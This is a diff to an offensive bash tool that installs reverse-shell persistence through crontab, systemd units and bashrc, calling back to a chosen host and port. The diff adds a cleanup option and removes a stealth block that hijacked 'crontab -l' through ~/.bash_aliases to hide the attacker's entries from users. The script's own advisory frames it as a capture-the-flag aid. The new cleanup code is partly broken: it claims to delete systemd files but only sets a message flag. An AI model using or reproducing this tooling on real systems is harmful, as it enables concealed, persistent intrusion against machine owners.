@@ -3,6 +3,9 @@
 # The basic idea is that you have commands that can execute reverse shells (methods, e.g. bash) and ways to make those shells persist on the system (doors, e.g. crontab)
 # The script will enumerate all methods available and for each, enumerate all doors
 
+CLEAN=0
+CLEANCRONTMP=$(mktemp)
+CLEANSYSMSG=0
 CRON="* * * * *"
 DISABLEBASHRC=0
 DRYRUN=0
@@ -16,6 +19,7 @@ STEALTHMODE=0
 TMPCRON=$(mktemp)
 TMPSERVICE=$(mktemp -u | sed 's/.*\.//g').service
 TMPSERVICESHELLSCRIPT=$(mktemp -u | sed 's/.*\.//g').sh
+VALIDSYNTAX=0
 
 INFO="Automatically install multiple methods of persistence\n\nAdvisory: This was developed with CTFs in mind and that is its intended use case. The stealth-mode option is for King of the Hill style competitions where others might try and tamper with your persistence. Please do not use this tool in an unethical or illegal manner.\n"
 HELP="
@@ -23,7 +27,8 @@ HELP="
 \e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate\n
 \e[33m-i, --rhost\e[0m IP/domain to call back to\n
 \e[33m-p, --rport\e[0m port to call back to\n
-\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans - see documentation"
+\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans - see documentation\n
+\e[33m-c, --clean\e[0m reverts any alterations made by this program for the given RHOST"
 
 while test $# -gt 0;
 do
@@ -52,49 +57,44 @@ do
 				export RPORT=$1
 			fi
 			shift ;;
+		-c|--clean)
+			CLEAN=1
+			shift ;;
 	esac
 done
 
-if [ "$DRYRUN" -eq 0 ];
+if [ "$CLEAN" -eq 1 ];
 then
-	if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
+	if $(echo $RHOST | grep -qi "[A-Za-z0-9]");
 	then
-		:
+		VALIDSYNTAX=1
 	else
-		echo -e $INFO
-		echo -e $HELP
-		exit
-	fi
-else
-	if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
-	then
 		echo -e $INFO
 		echo -e $HELP
 		exit
 	fi
 fi
 
-if [ "$STEALTHMODE" -eq 1 ];
+if [ "$VALIDSYNTAX" -eq 0 ];
 then
-	TMPSERVICE=.$(mktemp -u | sed 's/.*\.//g').service
-	TMPSERVICESHELLSCRIPT=.$(mktemp -u | sed 's/.*\.//g').sh
-	DISABLEBASHRC=1
-	# For crontab, I can either do the carriage return trick
-	# echo -e "* * * * * echo task\rno crontab for $USER" | crontab
-	# or use the bashrc to "hijack" "crontab -l" to list everything but ours
-	# for the carriage return trick, remember you may have to count columns to properly fill space
-	echo 'function crontab () {
-	REALBIN="$(which crontab)"
-	if $(echo "$1" | grep -qi "\-l");
+	if [ "$DRYRUN" -eq 0 ];
 	then
-		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
-	elif $(echo "$1 | grep -qi "\-r);
-	then
-		if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
+		if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
+		then
+			:
+		else
+			echo -e $INFO
+			echo -e $HELP
+			exit
+		fi
 	else
-		$REALBIN "${@:1}"
+		if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
+		then
+			echo -e $INFO
+			echo -e $HELP
+			exit
+		fi
 	fi
-	}' >> ~/.bash_aliases
 fi
 
 # Perl and Node are broken; going to fix 
@@ -240,7 +240,58 @@ shadow() {
 	fi
 }
 
+cleanup() {
+
+	# remove from bashrc
+	if $(cat ~/.bashrc | grep -q $1);
+	then
+		TMPCLEANBASHRC=$(mktemp)
+		grep --color=never -v $1 ~/.bashrc > $TMPCLEANBASHRC
+		cp $TMPCLEANBASHRC ~/.bashrc
+		echo -e "\e[92m[+]\e[0m Cleaned bashrc"
+
+	fi
+
+	# remove from crontab
+	CRONBINARY=$(which crontab)
+	if $($CRONBINARY -l 2> /dev/null | grep -q $1);
+	then
+		$CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
+		echo -e "\e[92m[+]\e[0m Cleaned crontab"
+	fi
+
+	# this removes both the .service and .sh files
+	for i in $(find /etc/systemd/ -writable -type f);
+	do
+		grep -q $1 $i
+		if [[ $? -eq 0 ]];
+		then
+			TMP=$(echo $i | sed 's/.*\///g' | sed 's/\..*//g')
+			for j in $(find /etc/systemd/ -writable -type f);
+			do
+				grep -q $TMP $j 2> /dev/null
+				if [[ $? -eq 0 ]];
+				then
+					CLEANSYSMSG=1
+				fi
+			done
+		fi
+	done
+
+	if [ "$CLEANSYSMSG" -eq 1 ];
+	then
+		echo -e "\e[92m[+]\e[0m Cleaned systemctl"
+	fi
+
+	# remove from webserver, need to finish the install part first
+}
+
 main() {
+	if [ "$CLEAN" -eq 1 ];
+	then
+		cleanup $RHOST
+		exit
+	fi
 	enum_methods
 	sudo_hijack_attack $PASSWDFILE
 	webserver_poison_attack
